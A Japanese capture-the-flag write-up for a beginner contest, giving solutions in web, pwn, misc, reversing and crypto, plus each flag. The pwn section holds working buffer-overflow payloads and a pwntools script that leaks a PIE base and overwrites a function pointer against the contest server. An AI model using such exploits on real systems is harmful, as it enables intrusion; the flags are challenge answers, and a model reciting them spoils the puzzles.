Satoooon氏([twitter](https://twitter.com/Satoooon1024))にseccampにて本CTFについて教えていただき、ゆるゆると参加させていただきました。初心者の方が多く参加されているらしいので、いつも書いているWriteupよりも説明を多めに入れています。

主催者の皆様、素晴らしい時間をありがとうございました。

## Web

### web_meta

配布されたHTMLファイルの7行目にFlagが書かれています。

```html
    <meta name="description" content="flag is nitic_ctf{You_can_see_dev_too1!}">
```

Flag: `nitic_ctf{You_can_see_dev_too1!}`

### long flag

問題文にてURLが渡されているのでアクセスしてみると、なにも無い (ように見える) ページが表示されます。HTMLソースを読むことでFlagは一文字ずつ `span` タグに囲まれた上で `display: none;` スタイルによって隠されていることなどがわかります。以下は幾つか存在する解き方の一例です。

```python
>>> import requests
>>> requests.get('https://quizzical-mcnulty-e4cdbf.netlify.app/').content.decode().replace('<span>','').replace('</span>','')[301:-469]
'nitic_ctf{Jy!Hxj$RdB$uA,b$uM.bN7AidL6qe4gkrB9dMU-jY8KU828ByP9E#YDi9byaF4sQ-p/835r26MT!QwWWM|c!ia(ynt48hBs&-,|3}'
```

Flag: `nitic_ctf{Jy!Hxj$RdB$uA,b$uM.bN7AidL6qe4gkrB9dMU-jY8KU828ByP9E#YDi9byaF4sQ-p/835r26MT!QwWWM|c!ia(ynt48hBs&-,|3}`

## Pwn

### pwn monster 1

バッファオーバーフローの脆弱性を突く問題です。

```
$ nc 35.200.120.35 9001
 ____                 __  __                 _
|  _ \__      ___ __ |  \/  | ___  _ __  ___| |_ ___ _ __
| |_) \ \ /\ / / '_ \| |\/| |/ _ \| '_ \/ __| __/ _ \ '__|
|  __/ \ V  V /| | | | |  | | (_) | | | \__ \ ||  __/ |
|_|     \_/\_/ |_| |_|_|  |_|\___/|_| |_|___/\__\___|_|
                        Press Any Key


Welcome to Pwn Monster World!

I'll give your first monster!

Let's give your monster a name!
+--------+--------------------+----------------------+
|name    | 0x0000000000000000 |                      |
|        | 0x0000000000000000 |                      |
|HP      | 0x0000000000000064 |                  100 |
|ATK     | 0x000000000000000a |                   10 |
+--------+--------------------+----------------------+
Input name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+--------+--------------------+----------------------+
|name    | 0x4141414141414141 |             AAAAAAAA |
|        | 0x4141414141414141 |             AAAAAAAA |
|HP      | 0x4141414141414141 |  4702111234474983745 |
|ATK     | 0x4141414141414141 |  4702111234474983745 |
+--------+--------------------+----------------------+
OK, Nice name.

Let's battle with Rival! If you win, give you FLAG.

[You] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwnchu HP: 4702111234474983745
[Rival] pwnchu HP: 9999
Your Turn.

Rival monster took 4702111234474983745 damage!


[You] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwnchu HP: 4702111234474983745
[Rival] pwnchu HP: -4702111234474973746
Win!

nitic_ctf{We1c0me_t0_pwn_w0r1d!}
```

Flag: `nitic_ctf{We1c0me_t0_pwn_w0r1d!}`

### pwn monster 2

配布されたソースコードを読むことで各種値を格納している変数の型が `int64_t` であり、チェックサムを突破した上で変数の値をオーバーフローさせられるだろうことがわかります。`pwn monster 1` と同じようにバッファオーバーフローの脆弱性を突き、相手の体力値をオーバーフローさせて負の値にすることでFlagを入手することができます。

```
$ echo -e "AAAAAAAAAAAAAAAA\x6f\x00\x00\x00\x00\x00\x00\x30\xff\xff\xff\xff\xff\xff\xff\xcf" | nc 35.200.120.35 9002
 ____                 __  __                 _
|  _ \__      ___ __ |  \/  | ___  _ __  ___| |_ ___ _ __
| |_) \ \ /\ / / '_ \| |\/| |/ _ \| '_ \/ __| __/ _ \ '__|
|  __/ \ V  V /| | | | |  | | (_) | | | \__ \ ||  __/ |
|_|     \_/\_/ |_| |_|_|  |_|\___/|_| |_|___/\__\___|_|
                        Press Any Key

Welcome to Pwn Monster World!
I'll give first monster!
Let's give your monster a name!
+--------+--------------------+----------------------+
|name    | 0x0000000000000000 |                      |
|        | 0x0000000000000000 |                      |
|HP      | 0x0000000000000064 |                  100 |
|ATK     | 0x000000000000000a |                   10 |
+--------+--------------------+----------------------+
Checksum: 110
Input name: +--------+--------------------+----------------------+
|name    | 0x4141414141414141 |             AAAAAAAA |
|        | 0x4141414141414141 |             AAAAAAAA |
|HP      | 0x300000000000006f |  3458764513820541039 |
|ATK     | 0xcfffffffffffffff | -3458764513820540929 |
+--------+--------------------+----------------------+
Checksum: 110
OK, Nice name.
Let's battle with Rival! If you win, give you FLAG.
[You] AAAAAAAAAAAAAAAAo HP: 3458764513820541039
[Rival] pwnchu HP: 9999
Your Turn.
Rival monster took -3458764513820540929 damage!
[You] AAAAAAAAAAAAAAAAo HP: 3458764513820541039
[Rival] pwnchu HP: 3458764513820550928
Rival Turn.
Your monster took 9999 damage!
[You] AAAAAAAAAAAAAAAA`������/��������pwnchu HP: 3458764513820531040
[Rival] pwnchu HP: 3458764513820550928
Your Turn.
Rival monster took -3458764513820540929 damage!
[You] AAAAAAAAAAAAAAAA`������/��������pwnchu HP: 3458764513820531040
[Rival] pwnchu HP: 6917529027641091857
Rival Turn.
Your monster took 9999 damage!
[You] AAAAAAAAAAAAAAAAQ������/��������pwnchu HP: 3458764513820521041
[Rival] pwnchu HP: 6917529027641091857
Your Turn.
Rival monster took -3458764513820540929 damage!
[You] AAAAAAAAAAAAAAAAQ������/��������pwnchu HP: 3458764513820521041
[Rival] pwnchu HP: -8070450532247918830
Win!
nitic_ctf{buffer_and_1nteger_overfl0w}

```

Flag: `nitic_ctf{buffer_and_1nteger_overfl0w}`

### pwn monster 3

問題文内で言及されている通り本問題では `PIE` という実行バイナリのセキュリティ機構が有効化されており、単純に呼び出す関数のアドレスを `show_flag` 関数のアドレスに書き換えるだけではFlagを入手することができません。`objdump` 等を用いることで `cry` 関数と `show_flag` 関数のオフセットを把握し、出力される `cry` 関数のアドレスからベースアドレスを求め、それに `show_flag` 関数のオフセットを加算したアドレスを入力することでFlagを入手することができます。

Solver:

```python
from pwn import *
from struct import pack

r = remote('35.200.120.35', 9003)

r.recvuntil('|cry()   | ')
base_addr = int(r.recvuntil(' |')[:-2], 16) - 0x134e

payload = b'A' * 32
payload += pack('<Q', base_addr + 0x1286)

r.sendlineafter('Input name: ', payload)
r.interactive()
```

Output:

```
> python .\solve.py
[x] Opening connection to 35.200.120.35 on port 9003
[x] Opening connection to 35.200.120.35 on port 9003: Trying 35.200.120.35
[+] Opening connection to 35.200.120.35 on port 9003: Done
[*] Switching to interactive mode
+--------+--------------------+----------------------+
|name    | 0x4141414141414141 |             AAAAAAAA |
|        | 0x4141414141414141 |             AAAAAAAA |
|HP      | 0x4141414141414141 |  4702111234474983745 |
|ATK     | 0x4141414141414141 |  4702111234474983745 |
|cry()   | 0x0000561bd7fc3286 |                      |
+--------+--------------------+----------------------+
OK, Nice name.
Let's battle with Rival! If you win, give you FLAG.
[You] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�2�� HP: 4702111234474983745
[Rival] pwnchu HP: 9999
Your Turn.
nitic_ctf{rewrite_function_pointer_is_fun}

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�2��: (null)
Rival monster took 4702111234474983745 damage!
[You] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�2�� HP: 4702111234474983745
[Rival] pwnchu HP: -4702111234474973746
Win!
Rival: I don't want to give you FLAG! bye~~
[*] Got EOF while reading in interactive
```

Flag: `nitic_ctf{rewrite_function_pointer_is_fun}`

## Misc

### excel

Excelの検索機能で `nitic_ctf{` を検索することでFlagを入手することができます。(U869セル)

Flag: `nitic_ctf{plz_find_me}`

### image_conv

Steg問を解くツール ([例](https://stegonline.georgeom.net/image))で画像を加工すれば (`LSB Half` など) Flagを入手することができます。

Flag: `nitic_ctf{high_contrast}`

## Rev

### protected

平文でパスワードが格納されているので `Ghidra` や `strings` などを使ってパスワードを入手し、プログラムに入力することでFlagを入手することができます。

```sh
$ ./chall
PASSWORD: sUp3r_s3Cr37_P4s5w0Rd
nitic_ctf{hardcode_secret}
```

Flag: `nitic_ctf{hardcode_secret}`

### report or repeat

Ghidra等でプログラムが何をしているのか詳しく見ていくと、暗号化処理等は行われておらず、XORでデータをエンコードしているだけだとわかります。 エンコード処理を行っている関数と逆の処理をするソルバを書くことで、Flagの書かれたPDFファイルを復元することができます。

<span style="color: #ffffff">ソルバを書く際に凡ミスして１時間くらい溶かしました（落単不可避）。</span>

Solver:

```python
import struct

key1 = bytearray(b'\x06\x8c\x77\x86\x11\xed\x25\x89\x66\x64\x79\x7d\xc9\x0d\xa5\x99\x44\x6b\x71\x47\xaa\x9e\x1b\x0a\xc3\xbf\x1e\x6e\xa6\x82\xf0\x61\x84\x35\x42\x90\x87\xb2\xb0\xc2\x3d\xf4\x12\x73\x45\x3e\xe9\xcd\x26\x41\x33\xa4\x5b\x2d\x53\xe8\x3a\xc5\xbc\x18\xe5\xba\x81\xeb\x58\x9f\x49\xcc\x2f\xac\xcf\x8a\x0b\x48\x24\x9c\xa2\xb4\x15\xd0\x1f\x19\xd3\x16\xf3\x07\x4b\x78\x80\x34\xe2\x31\xc1\x57\x00\x7e\x5e\x70\x54\x21\x69\x9b\x46\x6a\xb6\xcb\x9a\x40\xb9\x17\x6d\x59\xfc\xea\x60\x32\xdf\x75\xe3\x62\x38\xa7\x85\xd7\x03\xf1\x83\xb5\x55\x5f\xee\xfd\xad\x0e\x6c\xa3\x20\xc0\x13\x08\x02\x5a\x72\x9d\x5d\xfb\x88\x93\xf9\x39\x74\xd8\xd2\x4f\x04\x67\x3f\xce\xe1\x4d\xd5\xca\x2c\x94\x2b\xdb\x09\x2a\x37\xe7\x95\x29\x4e\x22\x01\x0f\xdc\xd4\xc8\x56\x7a\x14\xf8\xb8\x30\x43\xa8\xa9\xf5\x8d\x5c\xab\x6f\x96\x1a\x23\x4a\x0c\x2e\x51\xd6\x92\xc7\x52\x8e\xe4\x4c\x65\x68\x97\xbb\x05\xdd\xbe\xef\x8b\xb7\x98\x76\xc4\xda\xb3\x7b\xa1\x36\xa0\x91\xaf\xf6\xfa\xe0\x10\x27\x1c\xbd\xfe\x50\xde\x7c\xf2\xb1\xae\xc6\xd9\xe6\x3c\xd1\x7f\xff\x63\x1d\xec\x3b\x8f\x28\xf7')
key2 = bytearray(b'\x57\x85\x0e\x3b\xa5\x2f\x4c\x0a\x71\x75\xd5\x05\xff\x0b\x44\x2a\xd4\xb5\x11\xfa\x67\x23\xbd\xac\x9c\x47\x9d\x22\x5a\xef\x63\x39\xe5\xbf\x7e\x46\x64\xe3\x2e\xd1\xb9\x40\x92\x88\xa9\xa3\x02\x50\xc4\x35\x7d\x36\xcf\xe9\xb8\x96\xad\x98\x66\x74\x86\xc3\xec\x0f\x1c\x51\xe8\x1f\xc1\xd9\x16\x7f\xc0\xa8\xf4\x34\xc2\x19\x37\xea\x18\x42\x8b\xed\xda\xa1\x28\x1e\x3c\x6e\xa7\x8a\x09\x95\x94\x6d\x9e\x3d\x4a\x8f\x8c\x27\x5f\xe7\xde\xf8\xe0\x72\x6a\x82\x91\xeb\x08\xf9\xf5\xe2\x21\x2d\xe1\xf3\xc6\xba\x7a\x73\x01\x5d\xce\x3f\x59\xee\xcb\x60\x41\xd2\x58\xf6\xb4\x55\x78\x62\x70\x4e\xb2\xa4\xbb\xdb\xdc\x29\x9b\x97\xf7\x24\x76\x4b\x93\xa0\x43\xcc\x7b\xe6\x38\xa2\x65\xc5\xd8\x3a\x26\x8d\x69\xc7\xbc\x07\x25\xb1\x5e\xfb\xb0\x13\x77\xaf\x49\x99\xcd\xca\x04\xbe\x6c\xb7\x56\x6b\x17\x80\x87\x2b\x45\x81\x8e\x68\xf1\x53\x33\xa6\xfd\xd3\x0d\x2c\x14\x7c\x20\x83\x90\x4f\x1a\x89\xf0\xfe\x32\xdf\xd6\x06\x1b\xd0\xaa\xae\x79\xdd\x84\xe4\x03\x12\x9a\x6f\xab\xd7\x1d\x3e\xc9\x0c\x9f\x30\x10\x54\xb3\xf2\x15\x61\x5c\xb6\x31\x5b\x4d\xc8\xfc\x48\x52\x00')
key3 = bytearray(b'\x72\x1e\xec\x52\x38\xe9\xb5\xc2\x46\x47\x75\x1f\x53\x0f\xea\x27\xcf\x57\xd7\x6e\x8c\x8c\x89\x2a\xf2\x86\x8a\x7b\x19\x7a\x2e\x01\xab\x15\x08\xd3\x2b\x5b\x9f\x7c\x86\xde\x5d\x98\x3c\x6f\x82\x58\xf2\xea\x85\x62\xa5\x77\xf3\x9e\x3e\x37\x10\x8b\x9e\xa0\x71\x1b\xce\x9d\x7e\x2f\xb3\x17\x01\x65\x14\x5c\x79\x2f\xad\xe1\x28\xf9\x55\x92\x3a\x69\x1f\x12\x5e\xa6\x41\xa4\xdb\xda\x47\x3b\xe3\x28\x08\x09\xe9\x9c\xfa\x22\x7c\x62\xd2\x05\x28\x86\x95\xe4\x45\x8e\xd2\xe7\xeb\x66\xed\x58\x64\x42\xba\xa9\x70\x21\xa0\x91\x51\x68\xff\x7e\xa9\x6c\x12\x33\xbb\x7a\xde\x1b\xe0\xed\xce\x7c\x04\x01\xcf\x23\x17\x36\x78\x1b\x06\xd3\x5e\x25\x5e\x98\x86\x50\x4a\x0d\x31\x0c\x39\x96\x6e\x72\x2b\xc2\x0f\x31\xdd\x4c\xd7\x44\xa9\xf9\xb7\xed\x40\xb9\x68\x73\xa6\xb0\xef\x3e\x2e\x37\x03\xb6\xe4\x4c\xcb\x5d\x83\x74\x10\xf0\x54\x62\xc1\x28\xdf\x5c\xff\xa7\x6e\x84\x59\x39\xeb\x63\xa0\x5b\x17\x3d\x97\xee\xcb\x8b\x21\x7b\x77\x98\xd5\xa9\x59\x44\x8d\x38\x70\x06\xef\x7b\x63\x10\x07\x44\x51\xe9\x89\x29\xce\x3d\x5a\x4a\x0c\x33\x32\x21\x65\xd1\x6d\x7f\xd5\x81')

def decode(enc):
    res = [0] * 0x100
    for i in range(0x100):
        j = enc[i] ^ key3[i]
        res[key2[i]] = key1.index(j)
    return res

encoded = open('report.pdf.enc', 'rb')
decoded = open('report.pdf', 'wb')

while True:
    dat = []
    for _ in range(0x100):
        try:
            dat.append(ord(encoded.read(1)))
        except TypeError:
            continue
    if dat == []: break
    dec = decode(dat)
    for i in range(0x100):
        decoded.write(struct.pack("B", dec[i]))
```

Output:

```
> python .\solve.py
```

Flag: `nitic_ctf{xor+substitution+block-cipher}`

## Crypto

### Caesar Cipher

[CyberChef](https://gchq.github.io/CyberChef/#recipe=ROT13\(true,true,false,23\)&input=ZmRodmR1)などのツールを用いることでFlagを入手することができます。

Flag: `nitic_ctf{caesar}`

### ord_xor

配布されたPythonプログラムを一部書き換えて実行することでFlagを入手することができます。

Solver:

```python
encoded = open('flag', 'r').read()

def xor(c: str, n: int) -> str:
    temp = ord(c)
    for _ in range(n):
        temp ^= n
    return chr(temp)


flag = ""
for i in range(len(encoded)):
    flag += xor(encoded[i], i)

print(flag)
```

Output:

```
> python .\solve.py
nitic_ctf{ord_xor}
```

Flag: `nitic_ctf{ord_xor}`

### tanitu_kanji

配布されたPythonプログラムを一部書き換えて実行することでFlagを入手することができます。

Solver:

```python
alphabets = "abcdefghijklmnopqrstuvwxyz0123456789{}_"
after1    = "fl38ztrx6q027k9e5su}dwp{o_bynhm14aicjgv"
after2    = "rho5b3k17pi_eytm2f94ujxsdvgcwl{}a086znq"

encoded = open('flag', 'r').read()

def conv(s: str, table: str) -> str:
    res = ""
    for c in s:
        i = table.index(c)
        res += alphabets[i]
    return res

res = ''

for f0 in ['0', '1']:
    for f1 in ['0', '1']:
        for f2 in ['0', '1']:
            for f3 in ['0', '1']:
                for f4 in ['0', '1']:
                    for f5 in ['0', '1']:
                        for f6 in ['0', '1']:
                            for f7 in ['0', '1']:
                                for f8 in ['0', '1']:
                                    for f9 in ['0', '1']:
                                        flag = encoded
                                        fmt = f0+f1+f2+f3+f4+f5+f6+f7+f8+f9
                                        for f in fmt:
                                            if f == "1":
                                                flag = conv(flag, after1)
                                            else:
                                                flag = conv(flag, after2)
                                        if 'nitic' in flag:
                                            print('Format: ' + fmt)
                                            print('Flag:   ' + flag)
```

Output:

```
> python .\solve.py
Format: 1110010011
Flag:   nitic_ctf{bit_full_search}
```

Flag: `nitic_ctf{bit_full_search}`

## Welcome

### アンケート

i am member of Satoooon-san fan club :)

https://twitter.com/nanigasi_3/status/1434496977190809612

Flag: `nitic_ctf{Thank_you_for_answering_the_questionnaire}`
